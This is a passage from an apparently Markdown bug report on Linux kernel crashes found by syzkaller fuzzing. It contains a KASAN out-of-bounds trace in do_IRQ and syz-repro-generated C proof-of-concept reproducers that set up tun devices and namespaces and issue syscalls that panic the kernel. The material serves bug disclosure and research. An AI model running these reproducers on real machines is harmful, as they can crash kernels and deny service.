{\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop()\n{\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nuint64_t procid;\nvoid test()\n{\n\tsyscall(__NR_pipe2, 0x20000040, 0x4000);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (procid = 0; procid < 8; procid++) {\n\t\tif (fork() == 0) {\n\t\t\tfor (;;) {\n\t\t\t\tif (chdir(cwd))\n\t\t\t\t\tfail(\"failed to chdir\");\n\t\t\t\tuse_temporary_dir();\n\t\t\t\tint pid = do_sandbox_none();\n\t\t\t\tint status = 0;\n\t\t\t\twhile (waitpid(pid, &status, __WALL) != pid) {}\n\t\t\t}\n\t\t}\n\t}\n\tsleep(1000000);\n\treturn 0;\n}\n```\n\nfunny, just one call, ```pipe2```.\n\n## do_irq - alloca Out Of Bounds\n\n### Call Trace (Dump)\n\n```c\n[  144.100193] BUG: KASAN: alloca-out-of-bounds in do_IRQ+0x14f/0x190\n[  144.102273] Read of size 8 at addr ffff880071feef50 by task syz-executor7/3009\n[  144.105120] \n[  144.105718] CPU: 0 PID: 3009 Comm: syz-executor7 Not tainted 4.16.0-rc3+ #5\n[  144.108306] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  144.111094] Call Trace:\n[  144.111818]  <IRQ>\n[  144.112451]  dump_stack+0x127/0x213\n[  144.113456]  ? _atomic_dec_and_lock+0x18d/0x18d\n[  144.115195]  ? show_regs_print_info+0x12/0x12\n[  144.117092]  ? do_IRQ+0x14f/0x190\n[  144.118988]  print_address_description+0x60/0x22b\n[  144.121262]  ? do_IRQ+0x14f/0x190\n[  144.122434]  kasan_report.cold.6+0xac/0x2f4\n[  144.123688]  ? do_IRQ+0x14f/0x190\n[  144.125633]  ? common_interrupt+0xf/0xf\n[  144.128281]  </IRQ>\n[  144.129024]  ? crypto_shash_update+0x23d/0x2a0\n[  144.133518]  ? kasan_unpoison_shadow+0x4/0x40\n[  144.134680]  ? crypto_shash_update+0x24d/0x2a0\n[  144.135996]  ? ext4_inode_csum.isra.59+0x562/0xef0\n[  144.137176]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0\n[  144.138826]  ? _rcu_barrier+0x1850/0x1d60\n[  144.147204]  ? _cond_resched+0x10/0x20\n[  144.148327]  ? _cond_resched+0x10/0x20\n[  144.149289]  ? __getblk_gfp+0xf2/0xa30\n[  144.150261]  ? save_trace+0x300/0x300\n[  144.151229]  ? map_id_up+0x178/0x3a0\n[  144.152122]  ? make_kprojid+0x30/0x30\n[  144.152970]  ? lock_downgrade+0x6d0/0x6d0\n[  144.153854]  ? find_held_lock+0x33/0x1b0\n[  144.154777]  ? from_kprojid+0x89/0xc0\n[  144.155620]  ? ext4_inode_csum_set+0x17c/0x370\n[  144.156750]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0\n[  144.158064]  ? ext4_chunk_trans_blocks+0x20/0x20\n[  144.159246]  ? jbd2_write_access_granted.part.8+0x264/0x410\n[  144.163218]  ? jbd2_journal_file_inode+0x5d0/0x5d0\n[  144.164486]  ? rcu_note_context_switch+0x710/0x710\n[  144.165676]  ? jbd2_journal_get_write_access+0x98/0xb0\n[  144.166916]  ? __ext4_journal_get_write_access+0x143/0x200\n[  144.168336]  ? ext4_mark_inode_dirty+0x220/0xac0\n[  144.169455]  ? ext4_evict_inode+0xb33/0x19d0\n[  144.170611]  ? ext4_expand_extra_isize+0x560/0x560\n[  144.171777]  ? __lock_is_held+0xad/0x140\n[  144.172798]  ? ext4_xattr_ensure_credits+0x81/0x320\n[  144.173967]  ? ext4_xattr_delete_inode+0x269/0xe20\n[  144.175159]  ? ext4_evict_inode+0x8f6/0x19d0\n[  144.176233]  ? ext4_expand_extra_isize_ea+0x1a20/0x1a20\n[  144.177557]  ? __sb_start_write+0x16b/0x2f0\n[  144.178698]  ? __sb_start_write+0x171/0x2f0\n[  144.179765]  ? ext4_evict_inode+0xb33/0x19d0\n[  144.180905]  ? ext4_da_write_begin+0x1170/0x1170\n[  144.182053]  ? evict+0x45f/0x8f0\n[  144.182904]  ? lock_acquire+0x4a0/0x4a0\n[  144.183842]  ? wb_wakeup+0xc0/0xc0\n[  144.184705]  ? do_raw_spin_trylock+0x190/0x190\n[  144.185652]  ? bit_waitqueue+0x30/0x30\n[  144.186414]  ? ext4_da_write_begin+0x1170/0x1170\n[  144.187468]  ? evict+0x498/0x8f0\n[  144.188398]  ? destroy_inode+0x1e0/0x1e0\n[  144.189355]  ? iput+0x623/0xbc0\n[  144.193860]  ? lock_acquire+0x4a0/0x4a0\n[  144.202122]  ? rcu_read_lock_sched_held+0x102/0x120\n[  144.203252]  ? ext4_drop_inode+0x11e/0x400\n[  144.204290]  ? do_raw_spin_trylock+0x190/0x190\n[  144.205489]  ? _atomic_dec_and_lock+0xff/0x18d\n[  144.207104]  ? cpumask_local_spread+0x2c0/0x2c0\n[  144.210166]  ? fsnotify_grab_connector+0x18c/0x2e0\n[  144.212062]  ? iput+0x62b/0xbc0\n[  144.213507]  ? ext4_sync_fs+0xa00/0xa00\n[  144.215476]  ? dispose_list+0x390/0x390\n[  144.220125]  ? fsnotify_grab_connector+0x1bd/0x2e0\n[  144.223298]  ? fsnotify_recalc_mask.part.8+0xa0/0xa0\n[  144.230135]  ? fsnotify_first_mark+0x340/0x340\n[  144.231357]  ? dentry_unlink_inode+0x483/0x5b0\n[  144.232384]  ? release_dentry_name_snapshot+0x70/0x70\n[  144.233609]  ? lock_downgrade+0x6d0/0x6d0\n[  144.234590]  ? rcutorture_record_progress+0x10/0x10\n[  144.238561]  ? lock_acquire+0x4a0/0x4a0\n[  144.239920]  ? do_raw_spin_lock+0x1b0/0x1b0\n[  144.241197]  ? dput.part.24+0x23d/0x950\n[  144.242177]  ? d_delete+0x1ed/0x2c0\n[  144.243104]  ? vfs_rmdir+0x386/0x470\n[  144.244475]  ? do_rmdir+0x41c/0x5b0\n[  144.245746]  ? user_path_create+0x40/0x40\n[  144.247270]  ? __do_page_fault+0x4a3/0xe30\n[  144.248801]  ? exit_to_usermode_loop+0x16d/0x230\n[  144.250478]  ? exit_to_usermode_loop+0x1c6/0x230\n[  144.251700]  ? syscall_slow_exit_work+0x4d0/0x4d0\n[  144.252955]  ? do_syscall_64+0xb0/0x850\n[  144.254232]  ? SyS_mkdir+0x2c0/0x2c0\n[  144.255074]  ? do_syscall_64+0x25b/0x850\n[  144.255911]  ? exit_to_usermode_loop+0x1c6/0x230\n[  144.257570]  ? syscall_return_slowpath+0x4e0/0x4e0\n[  144.259317]  ? syscall_return_slowpath+0x342/0x4e0\n[  144.261118]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7\n[  144.263090]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[  144.264816]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  144.266695] \n[  144.267257] The buggy address belongs to the page:\n[  144.268975] page:ffffea0001c7fb80 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  144.271861] flags: 0x500000000000000()\n[  144.273191] raw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  144.275851] raw: ffffea0001c7fba0 ffffea0001c7fba0 0000000000000000 0000000000000000\n[  144.278015] page dumped because: kasan: bad access detected\n[  144.279598] \n[  144.280163] Memory state around the buggy address:\n[  144.281388]  ffff880071feee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.283488]  ffff880071feee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.285237] >ffff880071feef00: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb\n[  144.287223]                                                  ^\n[  144.288617]  ffff880071feef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.290465]  ffff880071fef000: 00 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2\n[  144.292215] ==================================================================\n[  144.296633] Disabling lock debugging due to kernel taint\n[  144.297823] Kernel panic - not syncing: panic_on_warn set ...\n```\n\n### PoC\n\ngenerated by syz-repro.\n\n```c\n#define _GNU_SOURCE\n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <linux/futex.h>\n#include <pthread.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <errno.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/prctl.h>\n#include <sys/resource.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <grp.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/if.h>\n#include <linux/if_ether.h>\n#include <linux/if_tun.h>\n#include <linux/ip.h>\n#include <linux/tcp.h>\n#include <net/if_arp.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/uio.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\n  static void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\n  static void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\n{\n\tint rv;\n\n\trv = vsnprintf(str, size, format, args);\n\tif (rv < 0)\n\t\tfail(\"tun: snprintf failed\");\n\tif ((size_t)rv >= size)\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\n}\n\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsnprintf_check(str, size, format, args);\n\tva_end(args);\n}\n\n#define COMMAND_MAX_LEN 128\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\n\nstatic void execute_command(bool panic, const char* format, ...)\n{\n\tva_list args;\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\n\tint rv;\n\n\tva_start(args, format);\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\n\trv = system(command);\n\tif (panic && rv != 0)\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\n\n\tva_end(args);\n}\n\nstatic int tunfd = -1;\nstatic int tun_frags_enabled;\n\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\n\n#define TUN_IFACE \"syz_tun\"\n\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\n\n#define LOCAL_IPV4 \"172.20.20.170\"\n#define REMOTE_IPV4 \"172.20.20.187\"\n\n#define LOCAL_IPV6 \"fe80::aa\"\n#define REMOTE_IPV6 \"fe80::bb\"\n\n#define IFF_NAPI 0x0010\n#define IFF_NAPI_FRAGS 0x0020\n\nstatic void initialize_tun(void)\n{\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\n\tif (tunfd == -1) {\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\n\t\treturn;\n\t}\n\tconst int kTunFd = 252;\n\tif (dup2(tunfd, kTunFd) < 0)\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\n\tclose(tunfd);\n\ttunfd = kTunFd;\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\n\t}\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\n\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\n}\n\n#define DEV_IPV4 \"172.20.20.%d\"\n#define DEV_IPV6 \"fe80::%02hx\"\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\n\nstatic void initialize_netdevices(void)\n{\n\tunsigned i;\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", \"ip6_vti0\",\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\n\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\n\texecute_command(0, \"ip link add dev veth1 type veth\");\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\n\t\tchar addr[32];\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\n\t}\n}\n\nstatic int read_tun(char* data, int size)\n{\n\tif (tunfd < 0)\n\t\treturn -1;\n\n\tint rv = read(tunfd, data, size);\n\tif (rv < 0) {\n\t\tif (errno == EAGAIN)\n\t\t\treturn -1;\n\t\tif (errno == EBADFD)\n\t\t\treturn -1;\n\t\tfail(\"tun: read failed with %d\", rv);\n\t}\n\treturn rv;\n}\n\nstatic void flush_tun()\n{\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\n\t\t;\n}\n\nstatic void loop();\n\nstatic void sandbox_common()\n{\n\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\tsetpgrp();\n\tsetsid();\n\n\tstruct rlimit rlim;\n\trlim.rlim_cur = rlim.rlim_max = 128 << 20;\n\tsetrlimit(RLIMIT_AS, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 8 << 20;\n\tsetrlimit(RLIMIT_MEMLOCK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_FSIZE, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_STACK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 0;\n\tsetrlimit(RLIMIT_CORE, &rlim);\n\n#define CLONE_NEWCGROUP 0x02000000\n\n\tif (unshare(CLONE_NEWNS)) {\n\t}\n\tif (unshare(CLONE_NEWIPC)) {\n\t}\n\tif (unshare(CLONE_NEWCGROUP)) {\n\t}\n\tif (unshare(CLONE_NEWUTS)) {\n\t}\n\tif (unshare(CLONE_SYSVSEM)) {\n\t}\n}\n\nstatic int do_sandbox_setuid(void)\n{\n\tif (unshare(CLONE_NEWPID))\n\t\tfail(\"unshare(CLONE_NEWPID)\");\n\tint pid = fork();\n\tif (pid < 0)\n\t\tfail(\"sandbox fork failed\");\n\tif (pid)\n\t\treturn pid;\n\n\tsandbox_common();\n\tif (unshare(CLONE_NEWNET))\n\t\tfail(\"unshare(CLONE_NEWNET)\");\n\tinitialize_tun();\n\tinitialize_netdevices();\n\n\tconst int nobody = 65534;\n\tif (setgroups(0, NULL))\n\t\tfail(\"failed to setgroups\");\n\tif (syscall(SYS_setresgid, nobody, nobody, nobody))\n\t\tfail(\"failed to setresgid\");\n\tif (syscall(SYS_setresuid, nobody, nobody, nobody))\n\t\tfail(\"failed to setresuid\");\n\n\tprctl(PR_SET_DUMPABLE, 1, 0, 0, 0);\n\n\tloop();\n\tdoexit(1);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase 